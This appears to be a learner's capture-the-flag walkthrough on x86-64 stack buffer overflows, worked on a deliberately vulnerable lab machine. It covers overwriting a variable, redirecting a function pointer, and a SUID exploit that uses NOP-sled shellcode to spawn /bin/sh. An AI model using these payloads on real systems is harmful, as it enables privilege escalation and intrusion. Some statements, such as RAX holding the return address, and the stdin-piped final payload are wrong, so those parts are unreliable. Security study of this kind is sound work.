# Buffer Overflows

## Task 1 Introduction

- Explore simple stack buffer overflows (without mitigation) on x86-64 linux programs.
- Use radare2 to examine the memory layout and familiarize with it.

## Task 2 Process Layout

When a program runs, the computer treats it as a process. Modern computers can run many processes at once, but they don’t truly run at the same time. Instead, the CPU rapidly switches between them. This fast switching is called a context switch.

Each process needs its own information to run—such as the current instruction and register values—so the operating system must store and manage all of this data. A process’s memory is arranged in a specific order:

+--------------------------------------+
|          Higher memory addresses     |
+--------------------------------------+
|          User Stack (↓)              |
+--------------------------------------+
|          Shared library regions      |
+--------------------------------------+
|          Run time heap (↑)           |
+--------------------------------------+
|          Read/Write Data             |
+--------------------------------------+
|          Read only code/data         |
+--------------------------------------+
|                  0                   |
+--------------------------------------+

Process Memory Layout (Simplified)
- User Stack  
Stores information the program needs while running, such as the program counter and saved registers. The stack grows downwards, and unused space below it is reserved in case it needs to grow.

- Shared Library Region  
Holds code for libraries the program uses, whether they are statically or dynamically linked.

- Heap  
Used for dynamic memory allocation (e.g., malloc). It grows upwards as needed, and unused space above it is reserved for future growth.

- Program Code and Data  
Contains the program’s executable instructions and its initialised global variables.

### Q1 Where is dynamically allocated memory stored? heap
### Q2 Where is information about functions(e.g. local arguments) stored? stack

## Task 3 x86-64 Procedures

A program contains many functions, and the computer needs a way to keep track of which function is running and what data is being passed between them. This is what the stack is used for. The stack is a continuous block of memory that helps manage function calls and data.

The top of the stack is at a lower memory address, and the stack grows downward toward even lower addresses.

Stack operations
- Push – add data to the top of the stack
- Pop – remove data from the top of the stack

push var (assembly)
When you push a value:
- Take the value of var
- Decrease the stack pointer (rsp) by 8 bytes
- Write the value to the new rsp location (the new top of the stack)
```
Before push:
rsp → 0x8

After push:
rsp → 0x0   (rsp decreased by 8)
```

pop var (assembly)
When you pop a value:
- Read the value at the address pointed to by rsp
- Store that value into var
- Increase rsp by 8 bytes
- Top of stack is memory location 0x8 where rsp points
```
Before pop:
rsp → 0x0   (top of stack)

After pop:
rsp → 0x8   (rsp increased by 8)
```

Important: popping does not erase memory — it only moves the stack pointer.

Stack frames
Each function gets its own stack frame, which stores:
- function arguments
- local variables
- return address

A new stack frame is created when a function is called and removed when it returns.

Example
```
int add(int a, int b){
    int new = a + b;
    return new;
}

int calc(int a, int b){
    int final = add(a, b);
    return final;
}

calc(4, 5);
```
Calling calc(4, 5) creates a stack frame for calc, which then calls add, creating another stack frame above it.

### Q1: What direction does the stack grow? (lower/higher), use the symbol "|" to represent lower and the symbol "/" to represent higher.
A: questions wrong answer is l.
### Q2: What instruction is used to add data onto the stack?
Answer: push

## Task 4 Procedures Continued

### Function Calls and Stack Frames

When the program runs inside the calc function:
- calc is the caller
- add is the callee

<img width="685" height="388" alt="image" src="https://github.com/user-attachments/assets/14fe4803-a5ae-40d0-962f-756f76f59e56" />

The instruction callq sym.add calls the add function.
When this happens:
- The CPU pushes the return address (the next instruction in calc) onto the stack.
- A new stack frame is created for add.
- The CPU updates:
    - rip → start of add
    - rsp → top of the new stack
    - rbp → base of the new frame

<img width="644" height="328" alt="image" src="https://github.com/user-attachments/assets/caa80e6e-683a-42f5-918b-418899329cb5" />


Stack Layout During the Call
Code
Stack Bottom
┌───────────────────────────────┐
│ Previous stack frame          │
├───────────────────────────────┤
│ Stack frame for calc          │
├───────────────────────────────┤
│ Return address (for calc)     │
├───────────────────────────────┤
│ Stack frame for add           │
└───────────────────────────────┘
Stack Top
When add finishes, it executes retq:
- Pops the return address off the stack
- Removes its stack frame
- Restores rsp, rbp, and rip to return to calc

<img width="650" height="358" alt="image" src="https://github.com/user-attachments/assets/f391035a-ad8c-45f7-a877-ac0916ce9dc3" />


Passing Data Between Functions
Arguments are passed using registers.
Up to 6 arguments can be stored in:

Register	Purpose
rdi	      1st argument
rsi	      2nd argument
rdx	      3rd argument
rcx	      4th argument
r8	      5th argument
r9	      6th argument


The return value is stored in rax.
If there are more than 6 arguments, the extras go on the stack.

Register Saving Rules
To prevent overwriting values:

Type	              Registers	                      Saved By
Caller-saved	      rax, r10, r11	                  Caller
Callee-saved	      rbx, r12, r13, r14, rbp, rsp	  Callee
Argument registers	rdi, rsi, rdx, rcx, r8, r9	    Caller


Runtime Stack Overview
```
┌───────────────────────────────┐
│ Argument n                    │
├───────────────────────────────┤
│ Argument 7                    │
├───────────────────────────────┤
│ Return address                │
├───────────────────────────────┤
│ Saved registers & local vars  │
└───────────────────────────────┘
```

### Q1 What register stores the return address? Answer: RAX

# Task 5: Endianess

Endianness (Simplified)
Computers store multi-byte values differently depending on their architecture.
Let’s take the hexadecimal number 0x12345678 as an example:

Most Significant Byte (MSB) → 12

Least Significant Byte (LSB) → 78

# Task 6 Overwriting Variables

Understanding Buffer Overflow
In the program, an integer variable and a character buffer are stored next to each other in memory.
Because memory is contiguous, writing too much data into the buffer can overwrite the integer variable.

int main(int argc, char **argv)
{
    volatile int variable = 0;
    char buffer[14];

    gets(buffer);

    if (variable != 0) {
        printf("You have changed the value of the variable\n");
    } else {
        printf("Try again?\n");
    }
}


Memory Alignment
Compilers often align variables to specific boundaries (like 8 or 16 bytes).
For example, if a 12‑byte array is allocated on a 16‑byte‑aligned stack, the compiler adds 4 bytes of padding to make it fit neatly.

Code
| buffer (12 bytes) | padding (4 bytes) |
Stack Frame Example
In the main function, the stack frame might look like this:

Code
| integer variable |
| character buffer |
Even though the stack grows downward, data written into the buffer moves from lower to higher addresses.
If too much data is entered, it can overwrite the integer variable.

Why gets() is Dangerous
The gets() function reads input without checking its length.
If you type more than 14 bytes, the extra data spills over into the integer variable’s memory space — changing its value.

Try It
Run the program and input more than 14 characters.
You’ll see that the integer variable’s value changes, demonstrating a buffer overflow.

- Ssh log in first
- Compile c code first
- Ends with normal warnings nothing of concern.
```
 ~]$ ls
overflow-1  overflow-2  overflow-3  overflow-4
 ~]$ cd overflow-1
1]$ ls -la
total 16
drwxrwxr-x 2 user1 user1   48 Sep  2  2019 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwxrwxr-x 1 user1 user1 8224 Sep  2  2019 int-overflow
-rw-rw-r-- 1 user1 user1  291 Sep  2  2019 int-overflow.c
```
Its actually compiled closer look at the file shows its listed as not stripped meaning the debugging information and functions are not removed.
```
[user1@ip-10-49-147-85 overflow-1]$ file int-overflow
int-overflow: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 3.2.0, BuildID[sha1]=847268d010c1aa1403e55a8891fc94d05b7ed123, not stripped
[user1@ip-10-49-147-85 overflow-1]$ 

```
If not compiled just gun with gcc to compile for c code:
```
 overflow-1]$ gcc int-overflow.c -o int-overflow
int-overflow.c: In function \u2018main\u2019:
int-overflow.c:10:3: warning: implicit declaration of function \u2018gets\u2019; did you mean \u2018fgets\u2019? [-Wimplicit-function-declaration]
   gets(buffer);
   ^~~~
   fgets
/tmp/ccfWv56Q.o: In function `main':
int-overflow.c:(.text+0x23): warning: the `gets' function is dangerous and should not be used.
```
## 
A closer look at RADARE2 

```
[user1@ip-10-49-147-85 overflow-1]$ radare2 int-overflow
 -- The Hard ROP Cafe
[0x00400450]> 
```
The Hard ROP Café” is just a fun radare2 startup banner, not an actual exploit technique.

Next start the analysis is 'aaa'
```
[user1@ip-10-49-147-85 overflow-1]$ radare2 int-overflow
 -- The Hard ROP Cafe
[0x00400450]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400450]> 
```
Next 'afl' to display the functions:
```

[0x00400450]> afl
0x00400450    1 42           entry0
0x00400480    4 42   -> 37   sym.deregister_tm_clones
0x004004b0    4 58   -> 55   sym.register_tm_clones
0x004004f0    3 34   -> 29   entry.fini0
0x00400520    1 7            entry.init0
0x004005f0    1 2            sym.__libc_csu_fini
0x004005f4    1 9            sym._fini
0x00400580    3 101  -> 92   sym.__libc_csu_init
0x00400400    3 23           sym._init
0x00400527    4 75           main
0x00400430    1 6            sym.imp.puts
0x00400440    1 6            sym.imp.gets
[0x00400450]> 

```
- View code if desired just wanted to see what error was but its just warning.
```
 overflow-1]$ cat int-overflow.c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int variable = 0;
  char buffer[14];

  gets(buffer);

  if(variable != 0) {
      printf("You have changed the value of the variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
The variable line 'char buffer[14];' pretty much tells me 14 is going to be the maximum it will handle, try a few sizes anyway.
14 bytes → Try again?
8 bytes → Try again?
32 bytes → Overflow + Segfault - this overwrites the the return address by one byte, 31 avoids it
15 bytes → Overflow (variable changed)

```
[user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
AAAAAAAAAAAAAA
Try again?
[user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
AAAAAAAA
Try again?
```
32 and 15 tried
```
[user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You have changed the value of the variable
Segmentation fault
[user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
AAAAAAAAAAAAAAA
You have changed the value of the variable
[user1@ip-10-49-129-36 overflow-1]$ 
```


Task 7 Overwriting Function Pointers

This uses overflow-2 folder, here is part of the C code:
```
overflow-2]$ cat func-pointer.c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

void special()
{
    printf("this is the special function\n");
    printf("you did this, friend!\n");
}

void normal()
{
    printf("this is the normal function\n");
}

void other()
{
    printf("why is this here?");
}

int main(int argc, char **argv)
{
    volatile int (*new_ptr) () = normal;
    char buffer[14];
    gets(buffer);
    new_ptr();
}
```
Similar to the example above, data is read into a buffer using the gets function, but the variable above the buffer is not a pointer to a function. A pointer, like its name implies, is used to point to a memory location, and in this case the memory location is that of the normal function. The stack is laid out similar to the example above, but this time you have to find a way of invoking the special function(maybe using the memory address of the function). Try invoke the special function in the program. 

Keep in mind that the architecture of this machine is little endian!

First of the endian is right at the start of 'file' command results:
```
overflow-2]$ file func-pointer
func-pointer: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 3.2.0, BuildID[sha1]=4a487843f261c593a102467ecb5ea0f8cbb69b98, not stripped
```
LSB = Little Endian 

## Why does the challenge mention LSB?
Because your exploit payload must contain the address of special() in little‑endian order.
When you overflow the buffer, you replace the bytes of new_ptr with the bytes of the address of special().

The CPU expects that address in little‑endian byte order.

A closer look at the functions using radare2 in AFL the address of special() is 0x00400567
```
overflow-2]$ radare2 func-pointer
 -- I love gradients.
[0x00400490]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400490]> afl
0x00400490    1 42           entry0
0x004004c0    4 42   -> 37   sym.deregister_tm_clones
0x004004f0    4 58   -> 55   sym.register_tm_clones
0x00400530    3 34   -> 29   entry.fini0
0x00400560    1 7            entry.init0
0x00400660    1 2            sym.__libc_csu_fini
0x00400664    1 9            sym._fini
0x00400593    1 22           sym.other
0x00400470    1 6            sym.imp.printf
0x004005f0    3 101  -> 92   sym.__libc_csu_init
0x00400438    3 23           sym._init
0x00400567    1 27           sym.special
0x00400460    1 6            sym.imp.puts
0x004005a9    1 58           main
0x00400480    1 6            sym.imp.gets
0x00400582    1 17           sym.normal
[0x00400490]> 
```
specail() located at 0x00400567
As 8‑byte little‑endian:
67 05 40 00 00 00 00 00
In a Python string:
b"\x67\x05\x40\x00\x00\x00\x00\x00"

Option A – inspect main in radare2
```
0x00400470]> pdf @ main
\u250c 58: int main (int argc, char **argv, char **envp);
\u2502           ; var char **var_30h @ rbp-0x30
\u2502           ; var int64_t var_24h @ rbp-0x24
\u2502           ; var char *s @ rbp-0x16
\u2502           ; var int64_t var_8h @ rbp-0x8
\u2502           ; arg int argc @ rdi
\u2502           ; arg char **argv @ rsi
\u2502           ; DATA XREF from entry0 @ 0x4004ad
\u2502           0x004005a9      55             push rbp
\u2502           0x004005aa      4889e5         mov rbp, rsp
\u2502           0x004005ad      4883ec30       sub rsp, 0x30
\u2502           0x004005b1      897ddc         mov dword [var_24h], edi    ; argc
\u2502           0x004005b4      488975d0       mov qword [var_30h], rsi    ; argv
\u2502           0x004005b8      48c745f88205.  mov qword [var_8h], sym.normal ; 0x400582
\u2502           0x004005c0      488d45ea       lea rax, [s]
\u2502           0x004005c4      4889c7         mov rdi, rax                ; char *s
\u2502           0x004005c7      b800000000     mov eax, 0
\u2502           0x004005cc      e8affeffff     call sym.imp.gets           ; char *gets(char *s)
\u2502           0x004005d1      488b55f8       mov rdx, qword [var_8h]
\u2502           0x004005d5      b800000000     mov eax, 0
\u2502           0x004005da      ffd2           call rdx
\u2502           0x004005dc      b800000000     mov eax, 0
\u2502           0x004005e1      c9             leave
\u2514           0x004005e2      c3             ret
[0x00400470]> 
```
From above the line in overflow-2/func-pointer.c code 'volatile int (*new_ptr) () = normal;' resembles 
```
0x004005b8      48c745f88205...   mov qword [var_8h], sym.normal
```
From the above pdf @ main we get 
\u2502           ; var char **var_30h @ rbp-0x30     -> argv
\u2502           ; var int64_t var_24h @ rbp-0x24    -> argc
\u2502           ; var char *s @ rbp-0x16            -> buffer
\u2502           ; var int64_t var_8h @ rbp-0x8      -> new_ptr


From pdf @ main:
- s (your buffer[14]) is at: rbp - 0x16
- var_8h (your new_ptr) is at: rbp - 0x8
- Distance between them: 0𝑥16 − 0𝑥8 = 0𝑥𝐸 = 14

So:

- 14 bytes → fill buffer
- next 8 bytes → overwrite new_ptr with the address of special()

You already have:
special() = 0x00400567
Little‑endian 8‑byte form: 67 05 40 00 00 00 00 00

So your final payload is:
```
python3 -c 'print("A"*14 + "\x67\x05\x40\x00\x00\x00\x00\x00")' | ./func-pointer
```

You should see: 
```
[... overflow-2]$ python --version
Python 2.7.18
[... overflow-2]$ python -c 'print("A"*14 + "\x67\x05\x40\x00\x00\x00\x00\x00")' | ./func-pointer
this is the special function
you did this, friend!
```
What this does is it fills buffer to limit 14 then fills the location of the variable with the location for special() and it runs

# Task 8 Buffer Overflow

Simple explanation of this challenge
```
[...overflow-3]$ cat buffer-overflow.c
#include <stdio.h>
#include <stdlib.h>

void copy_arg(char *string)
{
    char buffer[140];
    strcpy(buffer, string);
    printf("%s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    printf("Here's a program that echo's out your input\n");
    copy_arg(argv[1]);
}
```
Note the goal is to read the secret.txt file, the program has suid bit set. When any user runs this program, it executes with the permissions of the file’s owner (user2). So user1 temporarily becomes user2 for the duration of program. Idea is to spawn a shell within program t allow secret.txt file to read.

```
[user1@ip-10-49-146-85 overflow-3]$ ls -la
total 20
drwxrwxr-x 2 user1 user1   72 Sep  2  2019 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow
-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c
-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt
[user1@ip-10-49-146-85 overflow-3]$ 

```

Key points:
- buffer is 140 bytes.
- strcpy(buffer, string) copies without length checking.

If argv[1] is longer than 140 bytes, you:
- overflow buffer
- overwrite saved registers
- overwrite the return address

If you overwrite the return address with an address that points into your own buffer, and that buffer contains shellcode, the CPU will execute your shellcode when copy_arg returns.

To make hitting the shellcode easier, you prepend a NOP sled (\x90 bytes) before the shellcode.

Goal:
- Use this to spawn a shell (then read secret.txt via the SUID binary).

## Normal stack frame for copy_arg (before overflow):

text
          +---------------------------+
          |       Stack Bottom        |
          +---------------------------+
          |       Return address      |  <- where copy_arg will return to
          +---------------------------+
          |      Saved registers      |
          +---------------------------+
          |     buffer[139] ...       |
          |           ...             |
          |     buffer[1]             |
          |     buffer[0]             |
          +---------------------------+
          |        Stack Top          |
          +---------------------------+
Data is written from buffer[0] upwards in memory toward the return address.

## After you overflow buffer with shellcode + junk + address:

text
          +---------------------------------------------+
          |                 Stack Bottom                |
          +---------------------------------------------+
          | Address of buffer (overwritten ret addr)    |  <- now points into buffer
          +---------------------------------------------+
          | Random data (overwritten saved registers)   |
          +---------------------------------------------+
          | Random data (inside buffer)                 |
          +---------------------------------------------+
          | Shellcode (inside buffer)                   |
          +---------------------------------------------+
          |                 Stack Top                   |
          +---------------------------------------------+
When copy_arg returns, it uses the overwritten return address, which now points into your buffer (NOP sled + shellcode).

## Your payload in memory (what strcpy writes into buffer and beyond):

text
+-------------+-------------+-----------------+
|  NOP Sled   |  Shellcode  | Return Address  |
+-------------+-------------+-----------------+
^             ^             ^
|             |             |
|             |             +-- Overwrites saved return address
|             +---------------- Shellcode to execve("/bin/sh")
+----------------------------- Many \x90 bytes (NOPs)

Let’s say the buffer is 140 bytes.
You might structure it like this:

[ NOP sled (30–60 bytes) ]
[ Shellcode (~30 bytes) ]
[ Padding / junk (~50 bytes) ]
[ Overwritten return address (8 bytes) ]

- That totals roughly 140 + 8 bytes (8 is the overflow).
- The NOP sled doesn’t have to fill the entire buffer — it just needs to be large enough to absorb small address misalignments. 
- The junk code can be anything and the overwritten part is the address that leads to somewhere in the nop sled that leads to the shell code
- - Where our shell code for this example used is a bash shell in hex:
```
"\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" 
```

So the actual Python payload looks like:
```
python -c 'print(
    "\x90" * NOP_COUNT +
    "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" +
    "A" * PADDING +
    "<return address in little-endian>"
)' | ./buffer-overflow
```
Where:

NOP_COUNT = number of \x90 bytes (e.g. 30, 50, 100…)

PADDING = bytes to fill up to the saved return address

<return address in little-endian> = an address somewhere in the NOP sled region (e.g. start of buffer)

Where is return address obtained from:

From 'gbd' or 'radare2 -d' 
\xAA\xBB\xCC\xDD\xEE\xFF\x00\x00
by finding the runtime address of the buffer inside copy_arg().

- That address is not known from the C code.
- It is not printed by the program.
- It is not in the binary.

It is only known at runtime, so you must get it from:
- gdb  
or
- radare2 -d

This is how all classic stack‑based shellcode exploits work.

## example:

NOP_COUNT = 60 "\x90" * 60
PADDING=58bytes -> "A" * 58
shellcode = 30 bytes
<return address> = 8 bytes

```
python -c 'print(
    "\x90" * 60 +
    "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" +
    "A" * 58 +
    "\xAA\xBB\xCC\xDD\xEE\xFF\x00\x00"  # replace with real little-endian buffer address
)' | ./buffer-overflow
```
